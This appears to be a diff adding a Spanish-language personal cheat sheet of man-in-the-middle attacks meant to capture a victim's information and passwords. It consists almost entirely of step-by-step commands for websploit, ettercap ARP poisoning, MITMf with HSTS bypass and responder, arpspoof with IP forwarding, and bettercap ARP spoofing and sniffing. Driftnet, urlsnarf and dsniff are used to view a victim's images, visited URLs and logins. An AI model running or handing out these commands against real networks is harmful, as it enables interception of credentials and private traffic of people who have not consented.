@@ -1,0 +1,82 @@
+---------------------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// ATAQUES MITM - HOMBRE EN MEDIO PARA CAPTURAR INFORMACION Y CLAVES  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+WEBSPLOIT  //no funciono, el nuevo websploit 4.0 no tiene el modulo nerwork mitm
+apt-get install websploit
+websploit
+use network/mitm   //en kalilinux iniciamos websploit y luego escogemos esta opcion
+set router <ip del router>
+set target <ip victima>
+set sniffer drifnet    //Este es para ver las imagenes que la victima ve en el navegador
+set sniffer dnsiff     //Este sirve para guardar los links con logins que ve la victima se almacenan en sslstrip.log
+set sniffer urlsnarf   //muestra en consola los links que visita la victima
+run
+https://www.youtube.com/watch?v=3FEMV43iBeI
+https://www.youtube.com/watch?v=q5JLsWE2lXE  //websploit 4.0
+
+
+ETTERCAP + DRIFTNET  //tiene que ser el video del nuevo ettercap
+unfied snif  eth0   //abrimos ettercap y escogemos el snif y seleccionamos et0
+scan for host
+host list 
+add target 1 <ip propia>  //ip victima tambien
+add target 2 <ip victima>
+arp poisoning
+sniff remote 
+star sniffing
+drifnet    //en consola ponemos drifnet para ver las imagenes que esta viendo la victima
+
+
+MITMF//no reconoce el bash luego dela descarga
+apt-get install mitmf
+mitmf --hsts --arp --spoof -i eth0 --target <ip victima> --gateway <ip router> //puede ser este codigo o el de abajo
+mitmf -i wla0 --spoof --arp --gateway <ip router> --responder --wpad
+
+
+ARPSPOOF  //no reconoce el arpspoof como bash en kalilinux, depronto hay que descargarlo
+sysctl -w net.ipv4.ip_forward=1   //habilita el reenvio de paquetes en linux
+arpspoof -i wlan0 -t <IP Victim> <IP Router>
+driftnet -i wlan0   //ver imagenes del navegador de la victima
+urlsnarf -i wlan0   //ver las url que visita el navegador de la victima
+driftnet -i wlan0 -t <ip victima> <ip router> 
+sysctl -w net.ipv4.ip_forward=0   //desactiva el reenvio de paquetes
+
+
+BETTERCAP  //aparentemente se puede ver https
+apt-get install build-essential ruby-dev libpcap-dev
+git clone https://github.com/evilsocket/bettercap
+cd bettercap
+gem build bettercap.gemspec
+gem install bettercap*.gem
+bettercap
+bettercap -T --proxy -P POST    //para ve el trafico en la red 
+bettercap -T <IP V CTIMA> --proxy -P POST  //para ver el trafico en un dispositivo en especial
+
+BETTERCAP
+sudo apt full-upgrade
+sudo apt install bettercap
+setxkbmap es sundeadkeys
+sudo dpkg-reconfigure locales
+español
+sudo bettercap
+help arp.spoof
+get arp.spoof.*
+set arp.spoof.fullduplex true
+set arp.spoof.target 192.168.1.10
+set net.sniff.verbose true
+get arp.spoof.*
+net.probe on
+arp.spoof on
+net.sniff on
+
+
+
+
+
+
+
+
+
+
